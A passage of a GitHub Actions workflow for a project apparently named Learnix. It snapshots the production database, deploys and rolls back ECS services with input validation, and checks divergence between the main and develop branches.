        if: env.TARGET == 'production'
        env:
          DB_INSTANCE_ID: ${{ vars.DB_INSTANCE_ID }}
        run: |
          [ -n "$DB_INSTANCE_ID" ] || { echo "::error::GitHub environment variable DB_INSTANCE_ID is not set"; exit 1; }
          id="pre-deploy-$(date -u +%Y%m%d%H%M)-${GITHUB_SHA::7}"
          aws rds create-db-snapshot --db-instance-identifier "$DB_INSTANCE_ID" --db-snapshot-identifier "$id" \
            --tags Key=Purpose,Value=pre-deploy Key=Commit,Value="$GITHUB_SHA" >/dev/null
          aws rds wait db-snapshot-available --db-snapshot-identifier "$id"
          echo "Snapshot $id is available."

      - name: Migrate, then roll out (automatic rollback)
        env:
          ECS_CLUSTER: ${{ vars.ECS_CLUSTER }}
          ECS_SERVICES: ${{ vars.ECS_SERVICES }}
          MIGRATE_FAMILY: ${{ vars.MIGRATE_FAMILY }}
          TASK_NETWORK: ${{ vars.TASK_NETWORK }}
          DEPLOY_ALARMS: ${{ vars.DEPLOY_ALARMS }}
        run: |
          bash learnix-infra/scripts/ecs-deploy.sh \
            --cluster "$ECS_CLUSTER" \
            --services "$ECS_SERVICES" \
            --image "$IMAGE" \
            --migrate-family "$MIGRATE_FAMILY" \
            --network "$TASK_NETWORK" \
            --alarm-names "$DEPLOY_ALARMS"

      - name: Keep the rollback point
        if: always()
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: previous-task-definitions-api-${{ env.TARGET }}-${{ github.sha }}
          path: previous-task-definitions.json
          if-no-files-found: ignore
          retention-days: 30

      # Staging is behind a WAF IP allowlist that GitHub's runners are not on; enable per environment.
      - name: Read-only smoke test of the API host through CloudFront
        if: vars.SMOKE_FROM_RUNNER == 'true'
        env:
          API_URL: ${{ vars.API_URL }}
        run: bash scripts/smoke-test.sh "$API_URL"

  # Manual only. Points api (and worker) back at earlier task-definition revisions: paste the content of the
  # previous-task-definitions artifact of the deploy you are undoing, e.g.
  #   {"api":"arn:aws:ecs:eu-central-1:111122223333:task-definition/learnix-production-api:41",
  #    "worker":"arn:aws:ecs:eu-central-1:111122223333:task-definition/learnix-production-worker:41"}
  # Database changes are NOT reverted: migrations are expand/contract by policy; a data problem is a
  # point-in-time restore (learnix-infra/scripts/pitr-restore-drill.sh, runbook "Rollback").
  rollback:
    name: Roll back API on AWS (ECS)
    needs: control
    if: ${{ needs.control.outputs.rollback == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 45
    environment: ${{ needs.control.outputs.environment }}
    # Same group as `deploy`: a rollback must never interleave with a rollout of the same environment.
    concurrency:
      group: deploy-api-${{ needs.control.outputs.environment }}
      cancel-in-progress: false
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@7474bc4690e29a8392af63c5b98e7449536d5c3a # v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - name: Roll back
        env:
          PREVIOUS: ${{ inputs.previous_task_definitions }}
          ECS_CLUSTER: ${{ vars.ECS_CLUSTER }}
        run: |
          # Keys become the --services argument, so they are validated as strictly as the ARN values.
          echo "$PREVIOUS" | jq -e 'type == "object" and length > 0 and all(to_entries[]; (.key | test("^[A-Za-z0-9_-]+$")) and (.value | test("^arn:aws:ecs:[a-z0-9-]+:[0-9]{12}:task-definition/[A-Za-z0-9_-]+:[0-9]+$")))' >/dev/null \
            || { echo "::error::previous_task_definitions must map service names to task definition ARNs"; exit 1; }
          echo "$PREVIOUS" > rollback.json
          services=$(jq -r 'keys | join(",")' rollback.json)
          bash learnix-infra/scripts/ecs-deploy.sh --cluster "$ECS_CLUSTER" --services "$services" --rollback --to-file rollback.json

  # Read-only: never pushes, merges, or modifies either branch itself. Catches long-term divergence between
  # the production branch and the staging integration branch before it becomes a painful merge
  # (STAGING_ENVIRONMENT_IMPLEMENTATION_PLAN.md §11 / §12.1).
  branch-sync:
    name: Check main/develop divergence
    needs: control
    if: ${{ needs.control.outputs.branch_sync == 'true' }}
    # On a push it is advisory (the error is annotated but does not turn the whole run red). It used to be a
    # separate workflow, so its failure never decided whether ci.yml, and therefore the production
    # promotion gate, succeeded; folding it in must not change that. Nightly and manual runs still fail.
    continue-on-error: ${{ github.event_name == 'push' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Checkout (full history)
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: main must not be ahead of develop without a merge-back
        run: |
          git fetch origin main develop
          AHEAD=$(git rev-list --count origin/develop..origin/main)
          if [ "$AHEAD" -gt 0 ]; then
            echo "::error::main is $AHEAD commit(s) ahead of develop. A hotfix merged to main must be merged back into develop in the same change (see the plan's §11 hotfix procedure)."
            git log --oneline origin/develop..origin/main
            exit 1
          fi
          echo "main has no commits missing from develop."

      - name: develop should not drift indefinitely without a release
        run: |
          BEHIND=$(git rev-list --count origin/main..origin/develop)
          echo "develop is $BEHIND commit(s) ahead of main (awaiting release)."
          if [ "$BEHIND" -gt 100 ]; then
            echo "::warning::develop is $BEHIND commits ahead of main — consider cutting a release. This is a warning, not a failure: a long-lived develop is a process smell, not a safety issue the way main-ahead-of-develop is."
          fi
